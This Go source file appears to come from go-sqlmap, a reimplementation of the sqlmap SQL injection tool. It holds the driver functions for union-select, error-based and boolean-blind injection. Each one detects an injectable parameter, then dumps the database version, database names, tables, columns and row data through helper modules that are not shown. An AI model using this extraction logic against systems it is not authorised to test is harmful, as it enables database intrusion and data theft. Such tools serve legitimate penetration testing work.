package start

import (
	"github.com/EmYiQing/go-sqlmap/constant"
	"github.com/EmYiQing/go-sqlmap/input"
	"github.com/EmYiQing/go-sqlmap/line"
	"github.com/EmYiQing/go-sqlmap/log"
	"github.com/EmYiQing/go-sqlmap/parse"
)

// RunUnionSelect UnionSelect注入
func RunUnionSelect(fixUrl parse.BaseUrl, params input.Input, suffixList []string) bool {
	log.Info("start union select injection...")
	suffix, key := line.GetOrderByNum(fixUrl, params.Param, suffixList)
	if key == 0 {
		return false
	}
	paramKey := params.Param
	fixUrl.Params[paramKey] = constant.UnionSelectUnionCondition
	pos := line.GetUnionSelectPos(suffix, fixUrl, paramKey, key)
	if pos.StartIndex == 0 {
		return false
	}
	line.GetVersion(pos, suffix, fixUrl, paramKey, key)
	line.GetCurrentDatabase(pos, suffix, fixUrl, paramKey, key)
	line.GetAllDatabases(pos, suffix, fixUrl, paramKey, key)
	if params.Database != "" {
		line.GetAllTables(pos, suffix, fixUrl, paramKey, key, params.Database)
	}
	if params.Database != "" && params.Table != "" {
		line.GetColumns(pos, suffix, fixUrl, paramKey, key, params.Database, params.Table)
	}
	if params.Database != "" && params.Table != "" && len(params.Columns) > 0 {
		line.GetData(pos, suffix, fixUrl, paramKey, key, params.Database, params.Table, params.Columns)
	}
	return true
}

// RunErrorBased ErrorBased注入
func RunErrorBased(fixUrl parse.BaseUrl, params input.Input, suffixList []string) bool {
	log.Info("start error based injection...")
	success, suffix := line.DetectErrorBased(fixUrl, params.Param, suffixList)
	if !success {
		return false
	}
	if params.Beta == true {
		line.GetVersionByErrorBasedPolygon(fixUrl, params.Param, suffix)
		line.GetCurrentDatabaseByErrorBasedPolygon(fixUrl, params.Param, suffix)
		line.GetAllDatabasesByErrorBasedPolygon(fixUrl, params.Param, suffix)
		if params.Database != "" {
			line.GetAllTablesByErrorBasedPolygon(fixUrl, params.Param, suffix, params.Database)
		}
		if params.Database != "" && params.Table != "" {
			line.GetAllColumnsByErrorBasedPolygon(fixUrl, params.Param, suffix, params.Database, params.Table)
		}
		if params.Database != "" && params.Table != "" && len(params.Columns) > 0 {
			line.GetAllDataByErrorBasedPolygon(fixUrl, params.Param, suffix, params.Database, params.Table, params.Columns)
		}
	} else {
		line.GetVersionByErrorBased(fixUrl, params.Param, suffix)
		line.GetCurrentDatabaseByErrorBased(fixUrl, params.Param, suffix)
		line.GetAllDatabasesByErrorBased(fixUrl, params.Param, suffix)
		if params.Database != "" {
			line.GetAllTablesByErrorBased(fixUrl, params.Param, suffix, params.Database)
		}
		if params.Database != "" && params.Table != "" {
			line.GetAllColumnsByErrorBased(fixUrl, params.Param, suffix, params.Database, params.Table)
		}
		if params.Database != "" && params.Table != "" && len(params.Columns) > 0 {
			line.GetAllDataByErrorBased(fixUrl, params.Param, suffix, params.Database, params.Table, params.Columns)
		}
	}
	return true
}

// RunBoolBlind BoolBlind注入
func RunBoolBlind(target string, params input.Input, suffixList []string) bool {
	log.Info("start bool blind injection...")
	success, suffix := line.GetBoolBlindSuffix(target, suffixList)
	if !success {
		return false
	}
	line.GetVersionByBoolBlind(target, suffix)
	line.GetCurrentDatabaseByBoolBlind(target, suffix)
	line.GetAllDatabasesByBoolBlind(target, suffix)
	if params.Database != "" {
		line.GetAllTablesByBoolBlind(target, suffix, params.Database)
	}
	if params.Database != "" && params.Table != "" {
		line.GetAllColumnsByBoolBlind(target, suffix, params.Database, params.Table)
	}
	if params.Database != "" && params.Table != "" && len(params.Columns) > 0 {
		line.GetAllDataByBoolBlind(target, suffix, params.Database, params.Table, params.Columns)
	}
	return true
}
